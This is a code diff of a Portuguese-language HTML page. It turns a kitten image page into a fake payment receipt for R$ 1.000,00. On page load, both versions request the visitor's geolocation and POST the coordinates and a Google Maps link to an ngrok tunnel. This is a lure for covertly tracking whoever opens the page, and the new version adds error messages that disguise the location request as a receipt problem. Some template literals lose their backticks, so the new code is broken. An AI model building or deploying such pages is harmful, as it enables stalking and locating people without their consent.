@@ -1,77 +1,79 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gatinhos Pixelados</title>
-  <style>
-    body {
-      background-color: #ffcccb;
-      text-align: center;
-      font-family: 'Comic Sans MS', cursive;
-    }
-    .container {
-      margin-top: 50px;
-    }
-    .pixel-cat {
-      width: 150px;
-      height: 150px;
-      image-rendering: pixelated;
-      margin: 10px;
-    }
-    .cats {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-    .title {
-      font-size: 24px;
-      font-weight: bold;
-      color: #ff4081;
-    }
-  </style>
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
+
 <body>
-  <div class="container">
-    <h1 class="title">🐱 Gatinhos Pixelados 🐱</h1>
-    <div class="cats">
-      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 1">
-      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 2">
-      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 3">
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
   </div>
 
   <script>
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
     });
 
-    function sendLocation(position) {
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = ${dia}/${mes}/${ano};
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const maps = https://www.google.com/maps?q=${latitude},${longitude};
 
-      fetch("https://5057-187-59-186-51.ngrok-free.app/send-location", {
+      fetch("https://5057-187-59-186-51.ngrok-free.app/send-location", {  <!-- Substitua a URL do Ngrok aqui -->
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude, maps })
       })
-      .then(response => response.json())
-      .then(data => {
-        console.log("Localização enviada com sucesso!");
-      })
-      .catch(error => {
-        console.error("Erro ao enviar localização:", error);
-      });
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
     }
 
     function handleError(error) {
-      console.error("Erro ao obter a localização:", error.message);
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
+
 </html>
